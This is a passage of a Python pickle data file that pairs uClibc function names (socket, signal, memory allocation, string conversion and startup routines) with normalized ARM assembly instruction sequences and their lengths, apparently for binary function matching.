S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p302
L44L
tp303
a(S'bind'
p304
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p305
L44L
tp306
a(S'connect'
p307
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p308
L44L
tp309
a(S'getsockname'
p310
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p311
L44L
tp312
a(S'getsockopt'
p313
S'"STMFD~SP!,{R4,LR}\nLDR~R4,[SP,0]\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p314
L48L
tp315
a(S'listen'
p316
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p317
L44L
tp318
a(S'recv'
p319
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p320
L44L
tp321
a(S'recvfrom'
p322
S'"STMFD~SP!,{R4,R5,LR}\nADD~R4,SP,0\nLDMIA~R4,{R4,R5}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,R5,PC}"'
p323
L52L
tp324
a(S'send'
p325
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p326
L44L
tp327
a(S'sendto'
p328
S'"STMFD~SP!,{R4,R5,LR}\nADD~R4,SP,0\nLDMIA~R4,{R4,R5}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,R5,PC}"'
p329
L52L
tp330
a(S'setsockopt'
p331
S'"STMFD~SP!,{R4,LR}\nLDR~R4,[SP,0]\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p332
L48L
tp333
a(S'socket'
p334
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p335
L44L
tp336
a(S'raise'
p337
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R0\nBL~FOO\nMOV~R1,R4\nLDMFD~SP!,{R4,LR}\nB~FOO"'
p338
L24L
tp339
a(S'sigaddset'
p340
S'"SUBS~R3,R1,0\nSTR~LR,[SP,-0]\nBLE~FOO\nCMP~R3,0\nBGT~FOO\nLDR~LR,[SP]\nB~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R0,0\nLDR~PC,[SP]"'
p341
L48L
tp342
a(S'sigemptyset'
p343
S'"STR~LR,[SP,-0]\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p344
L24L
tp345
a(S'signal'
p346
S'"STMFD~SP!,{R4,R5,LR}\nCMN~R1,0\nCMPNE~R0,0\nSUB~SP,SP,0\nMOV~R4,R0\nBLE~FOO\nCMP~R0,0\nMOVLE~R0,0\nSTRLE~R1,[SP,0]\nBLE~FOO\nBL~FOO\nMOV~R3,0\nMOV~R2,0\nSTR~R3,[R0]\nB~FOO\nMOV~R3,0\nSTR~R3,[R2,-0]\nSUBS~R0,R0,0\nADD~R3,SP,0\nADD~R2,R3,R0,LSL0\nBPL~FOO\nADD~R5,SP,0\nADD~R0,R5,0\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nBLT~FOO\nMOV~R1,R4\nLDR~R0,<STR>\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nMOVNE~R3,0\nMOV~R2,SP\nMOV~R1,R5\nMOV~R0,R4\nSTR~R3,[SP,0]\nBL~FOO\nCMP~R0,0\nLDRGE~R2,[SP]\nBGE~FOO\nMOV~R2,0\nMOV~R0,R2\nADD~SP,SP,0\nLDMFD~SP!,{R4,R5,PC}"'
p347
L180L
tp348
a(S'__sigismember'
p349
S'"SUB~R1,R1,0\nMOV~R3,R1,LSR0\nLDR~R2,[R0,R3,LSL0]\nAND~R1,R1,0\nMOV~R3,0\nANDS~R3,R2,R3,LSLR1\nMOVEQ~R0,0\nMOVNE~R0,0\nRET"'
p350
L36L
tp351
a(S'__sigaddset'
p352
S'"SUB~R1,R1,0\nMOV~R12,R1,LSR0\nLDR~R3,[R0,R12,LSL0]\nAND~R1,R1,0\nMOV~R2,0\nORR~R3,R3,R2,LSLR1\nSTR~R3,[R0,R12,LSL0]\nMOV~R0,0\nRET"'
p353
L36L
tp354
a(S'__sigdelset'
p355
S'"SUB~R1,R1,0\nMOV~R12,R1,LSR0\nLDR~R3,[R0,R12,LSL0]\nAND~R1,R1,0\nMOV~R2,0\nBIC~R3,R3,R2,LSLR1\nSTR~R3,[R0,R12,LSL0]\nMOV~R0,0\nRET"'
p356
L36L
tp357
a(S'malloc'
p358
S'"STMFD~SP!,{R4-R6,LR}\nCMP~R0,0\nSUB~SP,SP,0\nMOVEQ~R0,0\nBEQ~FOO\nCMN~R0,0\nBHI~FOO\nADD~R3,R0,0\nADD~R4,SP,0\nSTR~R3,[R4,-0]\nLDR~R0,<STR>\nLDR~R5,<STR>\nMOV~LR,PC\nMOV~PC,R5\nMOV~R1,SP\nLDR~R0,<STR>\nBL~FOO\nLDR~R3,<STR>\nMOV~R4,R0\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nCMP~R4,0\nBNE~FOO\nLDR~R3,<STR>\nLDR~R4,[R3]\nLDR~R3,[SP]\nCMP~R3,R4\nADDCS~R3,R3,R4\nSUBCS~R3,R3,0\nRSBCS~R2,R4,0\nANDCS~R4,R3,R2\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R5\nMOV~R0,R4\nBL~FOO\nCMN~R0,0\nMOVEQ~R5,R0\nBEQ~FOO\nADD~R3,R0,0\nBIC~R5,R3,0\nCMP~R0,R5\nRSBNE~R0,R0,R5\nBLNE~FOO\nLDR~R0,<STR>\nLDR~R6,<STR>\nMOV~LR,PC\nMOV~PC,R6\nCMN~R5,0\nBEQ~FOO\nLDR~R3,<STR>\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R2,R4\nMOV~R1,R5\nLDR~R0,<STR>\nBL~FOO\nMOV~R1,SP\nLDR~R0,<STR>\nBL~FOO\nMOV~R4,R0\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R6\nCMP~R4,0\nBEQ~FOO\nLDR~R3,[SP]\nSTR~R3,[R4]\nCMP~R4,0\nBNE~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p359
L316L
tp360
a(S'calloc'
p361
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R1\nMUL~R4,R0,R5\nSUBS~R1,R0,0\nMOV~R0,R4\nBEQ~FOO\nBL~FOO\nCMP~R5,R0\nMOV~R5,0\nBEQ~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R5,R0,0\nMOV~R2,R4\nMOV~R1,0\nBLNE~FOO\nMOV~R0,R5\nLDMFD~SP!,{R4,R5,PC}"'
p362
L88L
tp363
a(S'free'
p364
S'"CMP~R0,0\nSTMFD~SP!,{R4-R8,LR}\nLDMEQFD~SP!,{R4-R8,PC}\nLDR~R5,[R0,-0]\nLDR~R8,<STR>\nSUB~R4,R0,0\nLDR~R7,<STR>\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R7\nMOV~R1,R4\nMOV~R2,R5\nMOV~R0,R8\nBL~FOO\nLDR~R3,<STR>\nLDR~R6,[R0]\nLDR~R3,[R3]\nCMP~R6,R3,LSL0\nMOV~R4,R0\nBCC~FOO\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R7\nMOV~R0,0\nBL~FOO\nADD~R5,R4,0\nCMP~R5,R0\nBEQ~FOO\nLDR~R0,<STR>\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDR~R0,<STR>\nLDMFD~SP!,{R4-R8,LR}\nB~FOO\nLDR~R2,[R4,0]\nCMP~R2,0\nLDRNE~R3,[R4,0]\nSTRNE~R3,[R2,0]\nLDR~R2,[R4,0]\nLDR~R3,[R4,0]\nCMP~R2,0\nSTRNE~R3,[R2,0]\nSTREQ~R3,[R8]\nLDR~R0,<STR>\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nRSB~R0,R6,R4\nADD~R0,R0,0\nRSB~R0,R5,R0\nBL~FOO\nLDR~R0,<STR>\nB~FOO"'
p365
L216L
tp366
a(S'realloc'
p367
S'"STMFD~SP!,{R4-R8,LR}\nSUBS~R4,R1,0\nMOV~R7,R0\nBNE~FOO\nBL~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4-R8,LR}\nB~FOO\nADD~R3,R4,0\nBIC~R5,R3,0\nCMP~R5,0\nLDR~R6,[R0,-0]\nMOVLS~R5,0\nCMP~R5,R6\nSUB~R8,R0,0\nBLS~FOO\nLDR~R3,<STR>\nRSB~R4,R6,R5\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R2,R4\nADD~R1,R8,R6\nLDR~R0,<STR>\nBL~FOO\nLDR~R3,<STR>\nMOV~R4,R0\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nCMP~R4,0\nADDNE~R3,R6,R4\nSTRNE~R3,[R7,-0]\nBNE~FOO\nSUB~R0,R5,0\nBL~FOO\nSUBS~R4,R0,0\nBEQ~FOO\nSUB~R2,R6,0\nMOV~R1,R7\nBL~FOO\nMOV~R0,R7\nBL~FOO\nMOV~R7,R4\nB~FOO\nADD~R3,R5,0\nCMP~R3,R6\nBHI~FOO\nLDR~R3,<STR>\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nADD~R1,R8,R5\nRSB~R2,R5,R6\nLDR~R0,<STR>\nBL~FOO\nLDR~R0,<STR>\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nSTR~R5,[R7,-0]\nMOV~R0,R7\nLDMFD~SP!,{R4-R8,PC}"'
p368
L264L
tp369
a(S'__heap_alloc'
p370
S'"LDR~R3,[R1]\nSTMFD~SP!,{R4,LR}\nADD~R3,R3,0\nBIC~R2,R3,0\nMOV~R4,R1\nCMP~R2,0\nMOV~R1,R0\nLDR~R0,[R0]\nMOVLS~R2,0\nB~FOO\nLDR~R12,[R0]\nCMP~R12,R2\nBCC~FOO\nADD~R3,R2,0\nCMP~R12,R3\nRSBCS~R3,R2,R12\nSTRCS~R3,[R0]\nBCS~FOO\nLDR~R2,[R0,0]\nCMP~R2,0\nLDRNE~R3,[R0,0]\nSTRNE~R3,[R2,0]\nLDR~R3,[R0,0]\nLDR~LR,[R0,0]\nCMP~R3,0\nSTRNE~LR,[R3,0]\nSTREQ~LR,[R1]\nMOVNE~R2,R12\nMOVEQ~R2,R12\nRSB~R3,R12,R0\nADD~R0,R3,0\nSTR~R2,[R4]\nLDMFD~SP!,{R4,PC}\nLDR~R0,[R0,0]\nCMP~R0,0\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p371
L148L
tp372
a(S'__heap_alloc_at'
p373
S'"STR~LR,[SP,-0]\nLDR~R12,[R0]\nMOV~LR,R0\nB~FOO\nLDR~R0,[R12]\nRSB~R3,R0,R12\nADD~R3,R3,0\nCMP~R3,R1\nBHI~FOO\nBNE~FOO\nADD~R3,R2,0\nBIC~R2,R3,0\nCMP~R0,R2\nBCC~FOO\nADD~R3,R2,0\nCMP~R0,R3\nRSBCS~R3,R2,R0\nSTRCS~R3,[R12]\nMOVCS~R0,R2\nLDRCS~PC,[SP]\nLDR~R2,[R12,0]\nCMP~R2,0\nLDRNE~R3,[R12,0]\nSTRNE~R3,[R2,0]\nLDR~R2,[R12,0]\nLDR~R3,[R12,0]\nCMP~R2,0\nSTRNE~R3,[R2,0]\nSTREQ~R3,[LR]\nLDR~PC,[SP]\nLDR~R12,[R12,0]\nCMP~R12,0\nBNE~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p374
L140L
tp375
a(S'__heap_link_free_area'
p376
S'"CMP~R2,0\nSTR~R3,[R1,0]\nSTR~R2,[R1,0]\nSTRNE~R1,[R2,0]\nSTREQ~R1,[R0]\nCMP~R3,0\nSTRNE~R1,[R3,0]\nRET"'
p377
L32L
tp378
a(S'__heap_link_free_area_after'
p379
S'"CMP~R2,0\nSTREQ~R1,[R0]\nSTRNE~R1,[R2,0]\nSTR~R2,[R1,0]\nRET"'
p380
L20L
tp381
a(S'__heap_free'
p382
S'"STMFD~SP!,{R4-R7,LR}\nLDR~R4,[R0]\nADD~LR,R1,R2\nMOV~R6,0\nB~FOO\nCMP~R3,R1\nBCS~FOO\nMOV~R6,R4\nLDR~R4,[R4,0]\nCMP~R4,0\nADD~R3,R4,0\nBNE~FOO\nB~FOO\nLDR~R12,[R4]\nRSB~R3,R12,R4\nADD~R3,R3,0\nCMP~R3,LR\nBHI~FOO\nADD~R7,R12,R2\nBNE~FOO\nCMP~R6,0\nBEQ~FOO\nADD~R3,R6,0\nCMP~R1,R3\nBNE~FOO\nLDR~R3,[R6]\nLDR~R2,[R6,0]\nMOV~R1,R4\nADD~R7,R7,R3\nBL~FOO\nB~FOO\nLDR~R5,[R4,0]\nCMP~R5,0\nBEQ~FOO\nLDR~R12,[R5]\nRSB~R3,R12,R5\nADD~R3,R3,0\nCMP~LR,R3\nBNE~FOO\nMOV~R2,R6\nMOV~R1,R5\nADD~R7,R7,R12\nBL~FOO\nMOV~R4,R5\nB~FOO\nADD~R4,R4,R2\nMOV~R3,R5\nMOV~R2,R6\nMOV~R1,R4\nBL~FOO\nMOV~R5,R4\nSTR~R7,[R4]\nB~FOO\nSUB~R5,LR,0\nSTR~R2,[LR,-0]\nMOV~R3,R4\nMOV~R2,R6\nMOV~R1,R5\nBL~FOO\nMOV~R0,R5\nLDMFD~SP!,{R4-R7,PC}"'
p383
L244L
tp384
a(S'abort'
p385
S'"SUB~SP,SP,0\nLDR~R0,<STR>\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R1,0\nB~FOO\nADD~R3,SP,0\nADD~R2,R3,R1,LSL0\nMOV~R3,0\nSTR~R3,[R2,-0]\nSUBS~R1,R1,0\nBPL~FOO\nADD~R4,SP,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R2,R0\nMOVEQ~R1,R4\nMOVEQ~R0,0\nBLEQ~FOO\nLDR~R2,<STR>\nLDR~R3,[R2]\nCMP~R3,0\nBNE~FOO\nADD~R3,R3,0\nSTR~R3,[R2]\nLDR~R3,<STR>\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nMOV~R0,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R3,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDR~R12,<STR>\nLDR~R3,[R12]\nCMP~R3,0\nBNE~FOO\nADD~R3,R3,0\nMOV~R1,0\nMOV~R0,SP\nMOV~R2,0\nSTR~R3,[R12]\nBL~FOO\nMOV~R3,0\nMOV~R1,0\nSTR~R3,[SP]\nB~FOO\nADD~R3,SP,0\nADD~R2,R3,R1,LSL0\nMOV~R3,0\nSTR~R3,[R2,-0]\nSUBS~R1,R1,0\nBPL~FOO\nMOV~R3,0\nMOV~R2,R3\nMOV~R1,SP\nMOV~R0,0\nSTR~R3,[SP,0]\nBL~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nADD~R3,R3,0\nSTR~R3,[R12]\nBL~FOO\nLDR~R3,[R12]\nCMP~R3,0\nADDEQ~R3,R3,0\nMOVEQ~R0,0\nSTREQ~R3,[R12]\nBLEQ~FOO\nBL~FOO"'
p386
L308L
tp387
a(S'atol'
p388
S'"MOV~R1,0\nMOV~R2,0\nB~FOO"'
p389
L12L
tp390
a(S'strtol'
p391
S'"MOV~R3,0\nB~FOO"'
p392
L8L
tp393
a(S'_stdlib_strto_l'
p394
S'"STMFD~SP!,{R4-R11,LR}\nMOV~R9,R1\nMOV~R5,R2\nMOV~R11,R3\nMOV~R4,R0\nB~FOO\nADD~R4,R4,0\nLDR~R3,<STR>\nLDRB~R2,[R4]\nLDR~R3,[R3]\nLDRB~R3,[R3,R2,LSL0]\nANDS~R3,R3,0\nBNE~FOO\nCMP~R2,0\nBEQ~FOO\nCMP~R2,0\nMOVNE~R7,R3\nMOVEQ~R7,0\nBEQ~FOO\nB~FOO\nMOV~R7,R3\nADD~R4,R4,0\nBICS~R3,R5,0\nMOVNE~R6,R0\nBNE~FOO\nLDRB~R3,[R4]\nCMP~R3,0\nADD~R5,R5,0\nMOVNE~R6,R0\nBNE~FOO\nLDRB~R3,[R4,0]\nORR~R3,R3,0\nCMP~R3,0\nSUB~R5,R5,0\nMOVEQ~R6,R4\nMOVNE~R6,R4\nMOVEQ~R5,R5,LSL0\nADDEQ~R4,R4,0\nCMP~R5,0\nMOVGE~R5,0\nSUB~R3,R5,0\nCMP~R3,0\nMOVHI~R12,0\nBHI~FOO\nMOV~R1,R5\nMOV~R0,0\nBL~FOO\nMOV~R1,R5\nMOV~R3,R0\nMOV~R0,0\nAND~R10,R3,0\nBL~FOO\nMOV~R12,0\nMOV~R8,R0\nB~FOO\nMOV~R6,R4\nLDRB~R2,[R4]\nSUB~R3,R2,0\nAND~R1,R3,0\nCMP~R1,0\nORR~R2,R2,0\nBLS~FOO\nCMP~R2,0\nSUB~R2,R2,0\nMOV~R1,0\nANDHI~R1,R2,0\nCMP~R1,R5\nADD~R4,R4,0\nBGE~FOO\nCMP~R12,R8\nMOVNE~R3,0\nMOVEQ~R3,0\nBHI~FOO\nCMP~R1,R10\nMOVLS~R3,0\nANDHI~R3,R3,0\nCMP~R3,0\nMLAEQ~R12,R5,R12,R1\nBEQ~FOO\nBL~FOO\nAND~R7,R7,R11\nMOV~R3,0\nMOV~R12,0\nSTR~R3,[R0]\nB~FOO\nCMP~R9,0\nSTRNE~R6,[R9]\nCMP~R7,0\nMOVNE~R4,0\nMOVEQ~R4,0\nCMP~R11,0\nCMPNE~R12,R4\nBLS~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R12,R4\nCMP~R7,0\nRSBNE~R12,R12,0\nMOV~R0,R12\nLDMFD~SP!,{R4-R11,PC}"'
p395
L404L
tp396
a(S'exit'
p397
S'"SUB~SP,SP,0\nLDR~R1,<STR>\nLDR~R2,<STR>\nLDR~R3,<STR>\nMOV~R4,R0\nMOV~R0,SP\nMOV~LR,PC\nMOV~PC,R3\nLDR~R3,<STR>\nLDR~R0,<STR>\nMOV~LR,PC\nMOV~PC,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nMOVNE~R0,R4\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R3,<STR>\nMOV~R0,SP\nMOV~R1,0\nMOV~LR,PC\nMOV~PC,R3\nBL~FOO\nLDR~R3,<STR>\nCMP~R3,0\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R0,R4\nBL~FOO"'
p398
L120L
tp399
a(S'sleep'
p400
S'"STMFD~SP!,{R4-R7,LR}\nSUBS~R12,R0,0\nSUB~SP,SP,0\nMOVNE~R1,0\nBNE~FOO\nB~FOO\nMOV~R3,0\nSTR~R3,[R2,-0]\nSUBS~R1,R1,0\nADD~R3,SP,0\nADD~R2,R3,R1,LSL0\nBPL~FOO\nADD~R6,SP,0\nMOV~R5,0\nMOV~R0,R6\nMOV~R1,0\nSTR~R12,[SP,0]\nSTR~R5,[SP,0]\nBL~FOO\nCMP~R0,R5\nBLT~FOO\nADD~R4,SP,0\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,R4\nBL~FOO\nCMP~R0,R5\nBNE~FOO\nMOV~R1,0\nMOV~R0,R4\nBL~FOO\nCMP~R0,R5\nMOVEQ~R1,0\nBEQ~FOO\nB~FOO\nMOV~R3,0\nSTR~R3,[R2,-0]\nSUBS~R1,R1,0\nADD~R3,SP,0\nADD~R2,R3,R1,LSL0\nBPL~FOO\nADD~R0,SP,0\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBLT~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,SP\nBL~FOO\nCMP~R0,0\nBGE~FOO\nBL~FOO\nADD~R1,SP,0\nMOV~R5,R0\nMOV~R2,0\nMOV~R0,0\nLDR~R4,[R5]\nBL~FOO\nMOV~R0,0\nSTR~R4,[R5]\nB~FOO\nLDR~R3,[SP]\nCMP~R3,0\nADD~R7,SP,0\nADD~R4,SP,0\nBNE~FOO\nMOV~R1,R4\nMOV~R0,R4\nBL~FOO\nMOV~R6,R0\nBL~FOO\nMOV~R1,R7\nMOV~R5,R0\nMOV~R2,0\nMOV~R0,0\nLDR~R4,[R5]\nBL~FOO\nSTR~R4,[R5]\nB~FOO\nMOV~R1,R7\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nMOV~R0,R4\nB~FOO\nADD~R0,SP,0\nMOV~R1,R0\nBL~FOO\nMOV~R6,R0\nCMP~R6,0\nBEQ~FOO\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nLDR~R3,[SP,0]\nCMP~R1,R2\nMOVLE~R0,R3\nADDGT~R0,R3,0\nB~FOO\nMOV~R0,0\nB~FOO\nMOV~R0,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p401
L416L
tp402
a(S'__uClibc_fini'
p403
S'"STMFD~SP!,{R4,LR}\nLDR~R3,<STR>\nLDR~R2,<STR>\nRSB~R3,R2,R3\nMOV~R4,R3,ASR0\nB~FOO\nLDR~R3,<STR>\nMOV~LR,PC\nLDR~PC,[R3,R4,LSL0]\nSUBS~R4,R4,0\nBCS~FOO\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nLDMEQFD~SP!,{R4,PC}\nMOV~LR,PC\nMOV~PC,R3\nLDMFD~SP!,{R4,PC}"'
p404
L92L
tp405
a(S'__pthread_return_0'
p406
S'"MOV~R0,0\nRET"'
p407
L8L
tp408
a(S'__check_one_fd'
p409
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R4,R1\nMOV~R1,0\nMOV~R5,R0\nBL~FOO\nCMN~R0,0\nLDMNEFD~SP!,{R4,R5,PC}\nMOV~R1,R4\nLDR~R0,<STR>\nBL~FOO\nCMP~R0,R5\nLDMEQFD~SP!,{R4,R5,PC}\nBL~FOO"'
p410
L52L
tp411
a(S'__uClibc_init'
p412
S'"LDR~R2,<STR>\nLDR~R3,[R2]\nCMP~R3,0\nSTR~LR,[SP,-0]\nLDR~R1,<STR>\nLDRNE~PC,[SP]\nADD~R3,R3,0\nSTR~R3,[R2]\nLDR~R3,<STR>\nMOV~R2,0\nCMP~R1,0\nSTR~R2,[R3]\nMOVNE~LR,PC\nMOVNE~PC,R1\nLDR~R3,<STR>\nCMP~R3,0\nLDREQ~PC,[SP]\nLDR~LR,[SP]\nB~FOO"'
p413
L76L
tp414
a(S'__uClibc_main'
p415
S'"MOV~R6,R2\nADD~LR,R2,R1,LSL0\nLDR~R2,[R2]\nSUB~SP,SP,0\nADD~R12,LR,0\nCMP~R12,R2\nMOV~R8,R1\nLDR~R2,<STR>\nLDR~R1,[SP,0]\nLDR~R4,<STR>\nSTR~R1,[R2]\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nSTR~R12,[R4]\nSTR~R1,[R2]\nMOV~R10,R0\nMOV~R2,0\nSTREQ~LR,[R4]\nMOV~R0,SP\nMOV~R1,0\nMOV~R7,R3\nBL~FOO\nLDR~R2,[R4]\nB~FOO\nMOV~R2,R1\nLDR~R3,[R2]\nCMP~R3,0\nMOV~R1,R2\nBNE~FOO\nMOV~R4,R2\nB~FOO\nCMP~R3,0\nADDLS~R0,SP,R3,LSL0\nMOVLS~R1,R4\nMOVLS~R2,0\nBLLS~FOO\nADD~R4,R4,0\nLDR~R3,[R4]\nCMP~R3,0\nBNE~FOO\nMOV~R0,SP\nBL~FOO\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R3,0\nMOVEQ~R3,0\nCMN~R2,0\nLDR~R2,<STR>\nSTR~R3,[R2]\nBNE~FOO\nBL~FOO\nMOV~R4,R0\nBL~FOO\nCMP~R4,R0\nBNE~FOO\nBL~FOO\nMOV~R4,R0\nBL~FOO\nCMP~R4,R0\nBNE~FOO\nLDR~R2,[SP,0]\nCMN~R2,0\nBEQ~FOO\nLDR~R3,[SP,0]\nCMP~R2,R3\nBNE~FOO\nLDR~R2,[SP,0]\nLDR~R3,[SP,0]\nCMP~R2,R3\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nLDR~R2,<STR>\nLDR~R3,<STR>\nRSB~R3,R2,R3\nLDR~R1,[R6]\nMOV~R5,R3,ASR0\nLDR~R3,<STR>\nLDR~R2,[SP,0]\nSTR~R1,[R3]\nLDR~R3,<STR>\nMOV~R4,0\nSTR~R2,[R3]\nB~FOO\nLDR~R3,<STR>\nMOV~LR,PC\nLDR~PC,[R3,R4,LSL0]\nADD~R4,R4,0\nCMP~R4,R5\nBCC~FOO\nCMP~R7,0\nMOVNE~LR,PC\nMOVNE~PC,R7\nLDR~R3,<STR>\nLDR~R2,<STR>\nRSB~R3,R2,R3\nMOV~R5,R3,ASR0\nMOV~R4,0\nB~FOO\nLDR~R3,<STR>\nMOV~LR,PC\nLDR~PC,[R3,R4,LSL0]\nADD~R4,R4,0\nCMP~R4,R5\nBCC~FOO\nLDR~R3,<STR>\nCMP~R3,0\nBEQ~FOO\nMOV~LR,PC\nMOV~PC,R3\nMOV~R3,0\nSTR~R3,[R0]\nLDR~R3,<STR>\nCMP~R3,0\nBEQ~FOO\nMOV~LR,PC\nMOV~PC,R3\nMOV~R3,0\nSTR~R3,[R0]\nLDR~R3,<STR>\nMOV~R1,R6\nLDR~R2,[R3]\nMOV~R0,R8\nMOV~LR,PC\nMOV~PC,R10\nBL~FOO"'
p416
L536L
tp417
a(S'sigaction'
p418
S'"STMFD~SP!,{R4-R6,LR}\nSUBS~R4,R1,0\nSUB~SP,SP,0\nMOV~R6,R0\nMOV~R5,R2\nBEQ~FOO\nMOV~R1,R4\nLDR~R3,[R1]\nADD~R0,SP,0\nMOV~R2,0\nSTR~R3,[SP,0]\nBL~FOO\nLDR~R1,[R4,0]\nTST~R1,0\nLDRNE~R3,[R4,0]\nSTR~R1,[SP,0]\nSTRNE~R3,[SP,0]\nBNE~FOO\nLDR~R2,<STR>\nLDR~R3,<STR>\nTST~R1,0\nMOVNE~R3,R2\nORR~R2,R1,0\nSTR~R3,[SP,0]\nSTR~R2,[SP,0]\nCMP~R4,0\nADDNE~R1,SP,0\nBNE~FOO\nMOV~R1,0\nCMP~R5,0\nMOVEQ~R2,R5\nMOVNE~R2,SP\nMOV~R3,0\nMOV~R0,R6\nBL~FOO\nSUBS~R3,R5,0\nMOVNE~R3,0\nCMP~R0,0\nMOVLT~R3,0\nCMP~R3,0\nMOV~R4,R0\nBEQ~FOO\nLDR~R3,[SP]\nMOV~R0,R5\nSTR~R3,[R0]\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[SP,0]\nSTR~R3,[R5,0]\nLDR~R3,[SP,0]\nSTR~R3,[R5,0]\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p419
L220L
tp420
a(S'__syscall_rt_sigaction'
p421
